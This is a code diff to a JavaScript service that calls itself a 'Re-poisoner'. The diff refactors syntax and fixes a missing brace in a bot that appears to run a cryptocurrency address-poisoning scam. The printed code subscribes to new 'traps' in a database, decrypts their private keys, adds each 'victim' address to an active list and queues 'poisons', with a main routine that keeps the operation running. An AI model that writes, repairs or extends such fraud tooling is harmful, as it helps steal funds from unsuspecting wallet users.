@@ -253,41 +253,39 @@ function subscribeToNewTraps() {
       {
         event: 'INSERT',
         schema: 'public',
-        table: 'traps',
+        table: 'traps'
       },
-      async (payload) => {
+      function (payload) {
         try {
-          const row = payload.new;
-          console.log(`[REALTIME] 🆕 New trap detected: ${row.victim_address}`);
+          var row = payload.new;
+          console.log('[REALTIME] New trap detected: ' + row.victim_address);
 
-          // Decrypt the private key
-          const privateKey = decrypt(row.trap_private_key_enc);
-          const victim = row.victim_address.toLowerCase();
-          const counterparty = row.counterparty_address ? row.counterparty_address.toLowerCase() : null;
-          const campaignId = row.campaign_id;
+          var privateKey = decrypt(row.trap_private_key_enc);
+          var victim = row.victim_address.toLowerCase();
+          var counterparty = row.counterparty_address ? row.counterparty_address.toLowerCase() : null;
+          var campaignId = row.campaign_id;
 
-          // Add to victims map
           victims.set(victim, {
-            privateKey,
+            privateKey: privateKey,
             trapAddress: row.trap_address.toLowerCase(),
-            counterparty,
+            counterparty: counterparty,
             lastPoison: 0,
             lastCounterPoison: 0,
-            campaignId,
-            victimAddress: victim,
+            campaignId: campaignId,
+            victimAddress: victim
           });
 
-          console.log(`[REALTIME] ✅ Added ${victim} to active victims (total: ${victims.size})`);
+          console.log('[REALTIME] Added ' + victim + ' to active victims (total: ' + victims.size + ')');
         } catch (err) {
-          console.error(`[REALTIME] Failed to process new trap: ${err.message}`);
+          console.error('[REALTIME] Failed to process new trap: ' + err.message);
         }
       }
     )
-    .subscribe((status) => {
+    .subscribe(function (status) {
       if (status === 'SUBSCRIBED') {
-        console.log('[DEBUG] ✅ Realtime subscription active - listening for new traps');
+        console.log('[DEBUG] Realtime subscription active');
       } else if (status === 'CHANNEL_ERROR') {
-        console.error('[DEBUG] ❌ Realtime subscription failed');
+        console.error('[DEBUG] Realtime subscription failed');
       }
     });
 }
@@ -1766,42 +1764,49 @@ function startWatcher() {
   // 🚀 No more polling! Real-time subscription handles new traps
   console.log('[DEBUG] Trap polling disabled - using real-time subscription instead');
 
-  // --- Graceful shutdown ---
-  setupGracefulShutdown();
+  console.log(`[DEBUG] Watcher started. Polling every ${scanConfig.pollIntervalMs / 1000}s, max ${scanConfig.maxBlocksPerScan} blocks per scan.`);
+} // <--- THIS IS THE MISSING CLOSING BRACE FOR startWatcher()
 
-  onShutdown(async () => {
-    console.log('[DEBUG] Shutting down...');
-    if (blockPollInterval) clearInterval(blockPollInterval);
-    if (caughtVictimsPollInterval) clearInterval(caughtVictimsPollInterval);
-    if (trapsReloadInterval) clearInterval(trapsReloadInterval);
-    if (realtimeSubscription) {
-      await realtimeSubscription.unsubscribe();
-      console.log('[DEBUG] Realtime subscription closed');
-    }
-    console.log('[DEBUG] All resources cleaned up.');
+// --- Graceful shutdown ---
+setupGracefulShutdown();
 
-    let totalQueued = 0;
-    for (const items of poisonQueue.values()) totalQueued += items.length;
-    if (totalQueued > 0) {
-      console.log(`[DEBUG] Flushing ${totalQueued} queued poisons before shutdown...`);
-      await flushAllQueues();
-    }
-  });
+onShutdown(async () => {
+  console.log('[DEBUG] Shutting down...');
+  if (blockPollInterval) clearInterval(blockPollInterval);
+  if (caughtVictimsPollInterval) clearInterval(caughtVictimsPollInterval);
+  if (trapsReloadInterval) clearInterval(trapsReloadInterval);
+  if (realtimeSubscription) {
+    await realtimeSubscription.unsubscribe();
+    console.log('[DEBUG] Realtime subscription closed');
+  }
+  console.log('[DEBUG] All resources cleaned up.');
 
-  // --- Main ---
+  let totalQueued = 0;
+  for (const items of poisonQueue.values()) totalQueued += items.length;
+  if (totalQueued > 0) {
+    console.log(`[DEBUG] Flushing ${totalQueued} queued poisons before shutdown...`);
+    await flushAllQueues();
+  }
+});
+
+// --- Main ---
+(async function () {
   console.log('[DEBUG] Loading traps from database...');
-  const loaded = await loadTrapsFromDB();
+
+  var loaded = await loadTrapsFromDB();
+
   if (loaded === 0) {
-    logger.error(`No victims loaded from database. Exiting.`);
-    console.error(`[DEBUG] No victims loaded. Exiting.`);
+    logger.error('No victims loaded from database. Exiting.');
+    console.error('[DEBUG] No victims loaded. Exiting.');
     process.exit(1);
   }
 
   await loadCaughtVictims();
 
-  // 🚀 Subscribe to new traps in real-time (no more polling!)
+  // Subscribe to new traps in real-time
   subscribeToNewTraps();
 
   console.log('[DEBUG] Starting watcher...');
   startWatcher();
-  logger.info('Re‑poisoner is running. Press Ctrl+C to stop.');
+  logger.info('Re-poisoner is running. Press Ctrl+C to stop.');
+})();
